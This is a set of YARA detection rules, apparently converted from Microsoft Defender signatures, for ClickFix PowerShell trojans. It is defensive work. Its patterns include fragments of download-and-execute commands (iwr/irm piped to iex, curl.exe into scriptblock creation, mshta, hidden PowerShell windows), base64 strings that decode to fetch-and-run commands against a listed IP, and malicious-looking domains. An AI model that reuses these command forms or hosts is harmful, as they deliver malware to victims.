rule Trojan_PowerShell_ClickFix_AB_2147948541_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:PowerShell/ClickFix.AB!MTB"
        threat_id = "2147948541"
        type = "Trojan"
        platform = "PowerShell: "
        family = "ClickFix"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_CMDHSTR_EXT"
        threshold = "12"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "invoke-webrequest" wide //weight: 1
        $x_1_2 = "iwr" wide //weight: 1
        $x_1_3 = "-useb" wide //weight: 1
        $x_10_4 = ".com/run/" wide //weight: 10
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_10_*) and 2 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule Trojan_PowerShell_ClickFix_SVI_2147977853_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:PowerShell/ClickFix.SVI"
        threat_id = "2147977853"
        type = "Trojan"
        platform = "PowerShell: "
        family = "ClickFix"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_CMDHSTR_EXT"
        threshold = "50"
        strings_accuracy = "High"
    strings:
        $x_10_1 = "powershell" wide //weight: 10
        $x_10_2 = "[scriptblock]::create((" wide //weight: 10
        $x_10_3 = "curl.exe" wide //weight: 10
        $x_10_4 = "--insecure -s" wide //weight: 10
        $x_10_5 = "http" wide //weight: 10
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_PowerShell_ClickFix_SVJ_2147977854_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:PowerShell/ClickFix.SVJ"
        threat_id = "2147977854"
        type = "Trojan"
        platform = "PowerShell: "
        family = "ClickFix"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_CMDHSTR_EXT"
        threshold = "50"
        strings_accuracy = "High"
    strings:
        $x_10_1 = "[powershell]::create()" wide //weight: 10
        $x_10_2 = ".addscript((curl.exe" wide //weight: 10
        $x_10_3 = "--insecure -s" wide //weight: 10
        $x_10_4 = ".invoke()" wide //weight: 10
        $x_10_5 = "http" wide //weight: 10
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_PowerShell_ClickFix_SVL_2147978583_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:PowerShell/ClickFix.SVL"
        threat_id = "2147978583"
        type = "Trojan"
        platform = "PowerShell: "
        family = "ClickFix"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_CMDHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {70 00 6f 00 77 00 65 00 72 00 73 00 68 00 65 00 6c 00 6c 00 [0-16] 20 00 2d 00 77 00 20 00 68 00 [0-16] 69 00 72 00 6d 00}  //weight: 1, accuracy: Low
        $x_1_2 = "|powershell -w h" wide //weight: 1
        $x_1_3 = "gg.ps1" wide //weight: 1
        $x_3_4 = {25 00 43 00 4f 00 4d 00 53 00 50 00 45 00 43 00 25 00 22 00 20 00 2f 00 63 00 20 00 73 00 74 00 61 00 72 00 74 00 20 00 22 00 22 00 20 00 2f 00 6d 00 69 00 6e 00 20 00 66 00 6f 00 72 00 20 00 2f 00 66 00 20 00 22 00 64 00 65 00 6c 00 69 00 6d 00 73 00 3d 00 40 00 22 00 [0-255] 64 00 6f 00 20 00 25 00 74 00}  //weight: 3, accuracy: Low
        $x_3_5 = {69 00 72 00 6d 00 20 00 31 00 34 00 35 00 30 00 30 00 30 00 33 00 32 00 30 00 37 00 2f 00 [0-48] 24 00 65 00 6e 00 76 00 3a 00 74 00 65 00 6d 00 70 00}  //weight: 3, accuracy: Low
        $x_3_6 = {69 00 72 00 6d 00 20 00 33 00 39 00 32 00 30 00 37 00 33 00 36 00 39 00 36 00 2f 00 [0-48] 24 00 65 00 6e 00 76 00 3a 00 74 00 65 00 6d 00 70 00}  //weight: 3, accuracy: Low
        $x_3_7 = {69 00 72 00 6d 00 20 00 33 00 35 00 33 00 38 00 37 00 35 00 31 00 39 00 2f 00 [0-48] 24 00 65 00 6e 00 76 00 3a 00 74 00 65 00 6d 00 70 00}  //weight: 3, accuracy: Low
        $x_3_8 = {69 00 72 00 6d 00 20 00 31 00 36 00 31 00 34 00 37 00 33 00 33 00 33 00 39 00 33 00 2f 00 [0-48] 24 00 65 00 6e 00 76 00 3a 00 74 00 65 00 6d 00 70 00}  //weight: 3, accuracy: Low
        $x_3_9 = "SW52b2tlLVdlYlJlcXVlc3QgJ2h0dHA6Ly8xNjYuMS44OS45MS96YXAvJyAtVXNlQmFzaWNQYXJzaW5nIHwgSW52b2tlLUV4cHJlc3Npb24=" wide //weight: 3
        $x_3_10 = "SW52b2tlLVdlYlJlcXVlc3QgJ2h0dHA6Ly8xNjYuMS44OS45MS9fLycgLVVzZUJhc2ljUGFyc2luZyB8IEludm9rZS1FeHByZXNzaW9u" wide //weight: 3
        $x_3_11 = "aQByAG0AIABoAHQAdABwADoALwAvADEANgA2AC4AMQAuADgAOQAuADkAMQAvAF8AfABpAGUAeAA=" wide //weight: 3
        $x_3_12 = "aQByAG0AIABoAHQAdABwADoALwAvADEANgA2AC4AMQAuADgAOQAuADkAMQAvAHoAYQBwAHwAaQBlAHgA" wide //weight: 3
        $x_3_13 = {6d 00 73 00 68 00 74 00 61 00 [0-48] 68 00 74 00 74 00 70 00 73 00 3a 00 2f 00 2f 00 31 00 39 00 30 00 32 00 2d 00 63 00 66 00 2e 00 63 00 6f 00 6d 00}  //weight: 3, accuracy: Low
        $x_3_14 = {6d 00 73 00 68 00 74 00 61 00 [0-48] 68 00 74 00 74 00 70 00 73 00 3a 00 2f 00 2f 00 [0-8] 2d 00 63 00 66 00 2e 00 63 00 6f 00 6d 00}  //weight: 3, accuracy: Low
        $x_3_15 = "4fb-ff/c19e1173-a40b-4198-b705-b85466f6cde0/119-73c4846d6ec9" wide //weight: 3
        $x_3_16 = {69 00 72 00 6d 00 [0-16] 73 00 74 00 65 00 61 00 6d 00 2e 00 72 00 75 00 6e 00 [0-16] 69 00 65 00 78 00}  //weight: 3, accuracy: Low
        $x_3_17 = {24 00 65 00 6e 00 76 00 3a 00 74 00 65 00 6d 00 70 00 [0-255] 69 00 77 00 72 00 [0-255] 76 00 6f 00 6c 00 61 00 6e 00 74 00 65 00 6f 00 6d 00 61 00 6c 00 65 00 74 00 61 00 2e 00 63 00 6c 00}  //weight: 3, accuracy: Low
        $x_3_18 = {27 00 6d 00 73 00 78 00 6d 00 6c 00 32 00 2e 00 78 00 6d 00 6c 00 68 00 74 00 74 00 70 00 [0-255] 69 00 65 00 78 00 28 00 67 00 63 00 20 00 24 00 65 00 6e 00 76 00 3a 00 74 00 6d 00 70 00 [0-48] 72 00 6d 00 20 00 24 00 65 00 6e 00 76 00 3a 00 74 00 6d 00 70 00}  //weight: 3, accuracy: Low
        $x_3_19 = {69 00 72 00 6d 00 20 00 63 00 22 00 64 00 22 00 6e 00 2e 00 6a 00 73 00 64 00 65 00 6c 00 69 00 76 00 72 00 2e 00 6e 00 65 00 74 00 2f 00 67 00 22 00 68 00 22 00 2f 00}  //weight: 3, accuracy: Low
        $x_3_20 = "holtandberyl.com/prw" wide //weight: 3
        $x_3_21 = "power!power! -nop -c iex(irm !a!!b!!c!!d!)" wide //weight: 3
        $x_3_22 = {63 00 6d 00 64 00 [0-48] 22 00 25 00 6c 00 6f 00 63 00 61 00 6c 00 61 00 70 00 70 00 64 00 61 00 74 00 61 00 25 00 5c 00 [0-128] 64 00 6f 00 20 00 40 00 69 00 66 00 20 00 25 00 7e 00 7a 00 66 00 3d 00 3d 00 [0-48] 63 00 6f 00 70 00 79 00 20 00 22 00 25 00 66 00 22 00 20 00 25 00 74 00 65 00 6d 00 70 00 25 00 5c 00 [0-48] 77 00 73 00 63 00 72 00 69 00 70 00 74 00 [0-48] 2e 00 76 00 62 00 73 00}  //weight: 3, accuracy: Low
    condition:
        (filesize < 20MB) and
        (
            ((3 of ($x_1_*))) or
            ((1 of ($x_3_*))) or
            (all of ($x*))
        )
}

rule Trojan_PowerShell_ClickFix_SVM_2147978684_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:PowerShell/ClickFix.SVM"
        threat_id = "2147978684"
        type = "Trojan"
        platform = "PowerShell: "
        family = "ClickFix"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_CMDHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {70 00 6f 00 77 00 65 00 72 00 73 00 68 00 65 00 6c 00 6c 00 [0-16] 20 00 2d 00 77 00 20 00 68 00 [0-16] 69 00 72 00 6d 00}  //weight: 1, accuracy: Low
        $x_1_2 = "|powershell -w h" wide //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_PowerShell_ClickFix_SVN_2147978685_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:PowerShell/ClickFix.SVN"
        threat_id = "2147978685"
        type = "Trojan"
        platform = "PowerShell: "
        family = "ClickFix"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_CMDHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {70 00 6f 00 77 00 65 00 72 00 73 00 68 00 65 00 6c 00 6c 00 [0-16] 69 00 72 00 6d 00 20 00 [0-80] 7c 00 70 00 6f 00 77 00 65 00 72 00 73 00 68 00 65 00 6c 00 6c 00 [0-16] 2d 00}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

